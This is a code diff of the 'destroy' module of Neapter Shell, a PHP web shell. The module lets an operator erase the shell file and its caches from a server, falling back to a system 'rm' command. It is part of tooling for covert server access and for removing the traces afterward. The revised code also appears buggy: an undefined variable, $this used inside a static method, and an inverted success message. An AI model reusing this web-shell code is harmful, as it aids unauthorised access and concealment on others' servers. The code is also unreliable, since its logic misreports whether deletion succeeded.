@@ -3,59 +3,68 @@
 /**
  * Neapter Shell
  *
+ * @category  WebShell
+ * @package   NeapterShell
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2012, Krzysztof Otręba
+ * @copyright 2011-2016 Krzysztof Otręba
  *
- * @license   http://www.gnu.org/licenses/gpl-3.0.txt
+ * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
+ * @link    http://github.com/krzotr/neapter-shell
  */
 
 /**
- * Trwale usuwanie shella
+ * Remove shell from server
  *
+ * @category  WebShell
+ * @package   NeapterShell
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2012, Krzysztof Otręba
+ * @copyright 2011-2016 Krzysztof Otręba
  *
- * @package    NeapterShell
- * @subpackage Modules
+ * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
+ * @link    http://github.com/krzotr/neapter-shell
  */
 class ModuleDestroy extends ModuleAbstract
 {
     /**
-     * Pierwszy klucz dostepowy
+     * Unique key. User have to put that key to remove shell
      *
-     * @access private
-     * @var    string
+     * @var string
      */
-    private $sKey;
+    protected $sKey;
 
     /**
-     * Drugi klucz dostepowy
+     * File to remove
      *
-     * @access private
-     * @var    string
+     * @var string
      */
-    private $sFinalKey;
+    protected $sFilename;
 
     /**
-     * Konstruktor
+     * Constructor, check if posix_getpwuid and posix_getgrgid exist
      *
-     * @access public
-     * @param  object $oShell Obiekt Shell
-     * @return void
+     * @param Shell $oShell Shell object
+     * @param Utils $oUtils Utils object
+     * @param Args  $oArgs  Args object
      */
-    public function __construct(Shell $oShell, Utils $oUtils = NULL, Args $oArgs = NULL)
-    {
+    public function __construct(
+        Shell $oShell,
+        Utils $oUtils,
+        Args $oArgs
+    ) {
         parent::__construct($oShell, $oUtils, $oArgs);
 
-        $this->sKey = strtoupper(substr(md5(Request::getServer('HOST')), 0, 8));
+        if (!($sKey = $this->oUtils->cacheGet('destroy_shell_key'))) {
+            $sKey = strtoupper(substr(md5(uniqid()), 0, 8));
+            $this->oUtils->cacheSet('destroy_shell_key', $sKey);
+        }
 
-        $this->sFinalKey = strtoupper(substr(md5(Request::getServer('SCRIPT_FILENAME')), 0, 8));
+        $this->sKey = $sKey;
+        $this->sFilename = $oUtils->getShellFilename();
     }
 
     /**
-     * Dostepna lista komend
+     * Get list of available commands
      *
-     * @access public
      * @return array
      */
     public static function getCommands()
@@ -67,70 +76,71 @@ class ModuleDestroy extends ModuleAbstract
     }
 
     /**
-     * Zwracanie wersji modulu
+     * Get module version
      *
-     * @access public
      * @return string
      */
     public static function getVersion()
     {
-        /**
-         * Wersja Data Autor
-         */
-        return '1.00 2011-09-10 - <krzotr@gmail.com>';
+        return '1.0.1 2016-06-18 - <krzotr@gmail.com>';
     }
 
     /**
-     * Zwracanie pomocy modulu
+     * Get details module information
      *
-     * @access public
      * @return string
      */
     public static function getHelp()
     {
-        return sprintf("Trwałe usuwanie shella\r\n\r\n\tUżycie:\r\n\t\tdestroy %s", '@todo');
+        $sHelp = <<<DATA
+Trwałe usunięcie NeapterShell. Plik %s zostanie usunięty wraz z wszystkimi plikami cache
+
+    Użycie:
+        remove
+        remove key
+
+    Przykład:
+        remove     - zostanie wyświetlony specjalny identyfikator
+        remove key - trwałe usunięcie shella
+DATA;
+
+        return sprintf($sHelp, $this->sFilename);
     }
 
     /**
-     * Wywalenie w kosmos
+     * Execute module
      *
-     * @access public
      * @return string
      */
     public function get()
     {
-        /**
-         * Help
-         */
         if ($this->oArgs->getNumberOfParams() === 0) {
-            return self::getHelp();
+            return sprintf(
+                "W celu usunięcia shell wprowadź \"%s\" jako parametr",
+                $sKey
+            );
         }
 
-        $sKey = $this->oArgs->getParam(0);
-        $sFinalKey = $this->oArgs->getParam(1);
+        if (($this->oArgs->getParam(0) === $this->sKey)) {
+            $this->oUtils->cacheFlush();
 
-        if (($sKey === $this->sKey)) {
-            if ($sFinalKey === $this->sFinalKey) {
-                $sFilePath = Request::getServer('SCRIPT_FILENAME');
+            if (! @unlink($this->sFilename)) {
+                /* Try to remove using system command */
+                if ($this->oUtils->isExecutable()) {
+                    $sCmd = sprintf('rm "%s"', $this->sFilename);
 
-                /**
-                 * Usuwanie pliku
-                 */
-                if (!unlink($sFilePath)) {
-                    if ($this->oShell->isExecutable()) {
-                        $this->oShell->getCommandSystem(sprintf('rm %s', $sFilePath));
-                    }
+                    $this->oShell->getCommandOutput($sCmd);
                 }
-
-                return sprintf('Shell %szostał usunięty', (!is_file($sFilePath) ? NULL : 'nie '));
-            } else {
-                return sprintf("Na pewno chcesz usunąć tego szela?\r\nJeżeli tak to wywołaj poniższe polecenie:\r\n\r\n\t:destroy %s %s\r\n\r\nPamiętaj, aby ciąg %s wpisać w odwrotniej kolejności",
-                    $this->sKey, $sFinalKey = strrev($this->sFinalKey), $sFinalKey
-                );
             }
+
+            clearstatcache();
+
+            return sprintf(
+                'Shell %szostał usunięty',
+                (is_file($this->sFilename) ? '' : 'nie ')
+            );
         }
 
         return self::getHelp();
     }
-
 }
